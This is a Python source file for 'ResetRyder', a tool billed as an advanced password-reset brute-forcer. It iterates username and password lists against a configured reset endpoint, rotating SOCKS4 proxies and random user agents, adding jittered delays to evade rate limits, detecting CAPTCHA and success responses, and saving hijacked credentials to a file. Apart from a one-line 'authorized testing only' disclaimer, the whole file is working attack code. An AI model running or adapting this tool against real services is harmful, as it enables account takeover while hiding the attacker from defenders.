import random
import argparse
import asyncio
import aiohttp
import logging
import json
import time
import re
import aiofiles
from aiohttp_socks import ProxyConnector
from fake_useragent import UserAgent
from typing import List, Dict, Optional, Tuple
from concurrent.futures import ThreadPoolExecutor

# Developer: SirCryptic (NullSecurityTeam)
# Info: ResetRyder - Advanced password reset brute-forcer - By NullSecurityTeam
# For authorized testing only. Unauthorized use is illegal.

# Logging setup
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# Argument parser
parser = argparse.ArgumentParser(description="ResetRyder - Advanced password reset brute-forcer")
parser.add_argument("-c", "--config", default="config.json", help="Path to config file")
parser.add_argument("-p", "--password_list", help="Path to password list file (overrides config)")
parser.add_argument("-u", "--username_list", help="Path to username list file (overrides config)")
parser.add_argument("-r", "--reset_url", help="Reset URL (overrides config)")
parser.add_argument("-x", "--proxy_list", help="Path to SOCKS4 proxy list file (overrides config)")
parser.add_argument("-t", "--rate_limit", type=float, help="Base rate limit in seconds (overrides config)")
parser.add_argument("-m", "--max_concurrency", type=int, help="Max concurrent requests (overrides config)")
parser.add_argument("-o", "--output_file", help="File for successful resets (overrides config)")
args = parser.parse_args()

# Load file helper
def load_file(file_path: str) -> List[str]:
    try:
        with open(file_path, "r") as f:
            return [line.strip() for line in f if line.strip()]
    except Exception as e:
        logger.error(f"Failed to load {file_path}: {e}")
        exit(1)

# Load config
def load_config(config_path: str) -> Dict:
    default_config = {
        "reset_url": "",
        "username_list": "usernames.txt",
        "password_list": "passwords.txt",
        "proxy_list": "proxies.txt",
        "rate_limit": 1.0,
        "max_concurrency": 10,
        "timeout": 10,
        "max_retries": 3,
        "output_file": "success.json",
        "payload": {"username": "{username}", "new_password": "{password}", "confirm_new_password": "{password}"},
        "success_indicators": ["success", "reset successful"],
        "failure_indicators": ["error", "invalid", "failed"],
        "captcha_indicators": ["captcha", "recaptcha", "verify you are not a bot"],
        "json_payload": False,
        "headers": {"Accept": "application/json, text/plain, */*"}
    }
    try:
        with open(config_path, "r") as f:
            config = json.load(f)
            default_config.update(config)
    except FileNotFoundError:
        logger.warning(f"Config file {config_path} not found, using defaults")
    except json.JSONDecodeError:
        logger.error(f"Invalid JSON in {config_path}, using defaults")
    
    # Override with CLI args if provided
    if args.reset_url: default_config["reset_url"] = args.reset_url
    if args.username_list: default_config["username_list"] = args.username_list
    if args.password_list: default_config["password_list"] = args.password_list
    if args.proxy_list: default_config["proxy_list"] = args.proxy_list
    if args.rate_limit: default_config["rate_limit"] = args.rate_limit
    if args.max_concurrency: default_config["max_concurrency"] = args.max_concurrency
    if args.output_file: default_config["output_file"] = args.output_file
    
    return default_config

config = load_config(args.config)
ua = UserAgent()

# Proxy pool with health check
class ProxyPool:
    def __init__(self, proxies: List[str], timeout: int = 5):
        self.proxies = []
        self.failed_proxies = set()
        self.timeout = timeout
        self._test_proxies(proxies)

    def _check_proxy(self, proxy: str) -> bool:
        try:
            import socks
            import socket
            s = socks.socksocket()
            s.set_proxy(socks.SOCKS4, *proxy.split(":"))
            s.settimeout(self.timeout)
            s.connect(("8.8.8.8", 53))
            s.close()
            return True
        except Exception:
            return False

    def _test_proxies(self, proxies: List[str]):
        logger.info("Testing proxies...")
        with ThreadPoolExecutor(max_workers=20) as executor:
            futures = {executor.submit(self._check_proxy, proxy): proxy for proxy in proxies}
            for future in futures:
                if future.result():
                    self.proxies.append(futures[future])
                else:
                    self.failed_proxies.add(futures[future])
        logger.info(f"Live proxies: {len(self.proxies)}, Failed: {len(self.failed_proxies)}")

    def get_proxy(self) -> Optional[str]:
        available = [p for p in self.proxies if p not in self.failed_proxies]
        return random.choice(available) if available else None

    def mark_failed(self, proxy: str):
        self.failed_proxies.add(proxy)
        logger.debug(f"Proxy failed: {proxy}")

# Load data
usernames = load_file(config["username_list"])
passwords = load_file(config["password_list"])
proxy_pool = ProxyPool(load_file(config["proxy_list"]), config["timeout"])

# Dynamic headers
def get_headers() -> Dict[str, str]:
    headers = config["headers"].copy()
    headers["User-Agent"] = ua.random
    headers["Content-Type"] = "application/json" if config["json_payload"] else "application/x-www-form-urlencoded"
    return headers

# Password reset attempt
async def reset_password(session: aiohttp.ClientSession, username: str, password: str) -> Tuple[bool, str]:
    payload = {k: v.format(username=username, password=password) for k, v in config["payload"].items()}
    data = json.dumps(payload) if config["json_payload"] else payload

    for attempt in range(config["max_retries"]):
        proxy = proxy_pool.get_proxy()
        if not proxy:
            logger.error("No live proxies remaining")
            return False, "No proxies"

        try:
            connector = ProxyConnector.from_url(f"socks4://{proxy}")
            async with session.post(
                config["reset_url"],
                data=data,
                headers=get_headers(),
                connector=connector,
                timeout=aiohttp.ClientTimeout(total=config["timeout"])
            ) as response:
                text = await response.text()
                status = response.status

                # Check for CAPTCHA
                if any(re.search(ind, text.lower()) for ind in config["captcha_indicators"]):
                    logger.warning(f"CAPTCHA detected for {username}:{password}")
                    return False, "CAPTCHA"

                # Success/failure detection
                if status == 200 and any(re.search(ind, text.lower()) for ind in config["success_indicators"]):
                    logger.info(f"Success: {username} -> {password}")
                    return True, ""
                elif any(re.search(ind, text.lower()) for ind in config["failure_indicators"]) or status >= 400:
                    logger.debug(f"Failed: {username}:{password} - Status: {status}")
                    break
                elif status == 429:  # Rate limit
                    logger.warning(f"Rate limited for {username}:{password}")
                    await asyncio.sleep(2 ** attempt)  # Exponential backoff

        except asyncio.TimeoutError:
            logger.error(f"Timeout for {username}:{password} (Attempt {attempt + 1})")
            proxy_pool.mark_failed(proxy)
        except Exception as e:
            logger.error(f"Error for {username}:{password}: {e}")
            proxy_pool.mark_failed(proxy)

        # Jittered retry delay
        await asyncio.sleep(random.uniform(0.5, 1.5) * config["rate_limit"] * (2 ** attempt))

    return False, "Max retries"

# Main execution
async def main():
    logger.info("Starting ResetRyder - Authorized testing only!")
    stats = {"attempts": 0, "success": 0, "captcha": 0, "failures": 0}
    async with aiohttp.ClientSession() as session:
        semaphore = asyncio.Semaphore(config["max_concurrency"])
        tasks = []

        async def limited_reset(username: str, password: str):
            async with semaphore:
                stats["attempts"] += 1
                success, reason = await reset_password(session, username, password)
                if success:
                    stats["success"] += 1
                    async with aiofiles.open(config["output_file"], "a") as f:
                        await f.write(json.dumps({"username": username, "password": password}) + "\n")
                elif reason == "CAPTCHA":
                    stats["captcha"] += 1
                else:
                    stats["failures"] += 1
                await asyncio.sleep(random.uniform(0.8, 1.2) * config["rate_limit"])
                return success

        # Process in chunks
        for username in usernames:
            for password in passwords:
                tasks.append(limited_reset(username, password))
                if len(tasks) >= config["max_concurrency"] * 2:
                    await asyncio.gather(*tasks)
                    logger.info(f"Progress: {stats}")
                    tasks.clear()

        if tasks:
            await asyncio.gather(*tasks)
            logger.info(f"Final stats: {stats}")

if __name__ == "__main__":
    asyncio.run(main())
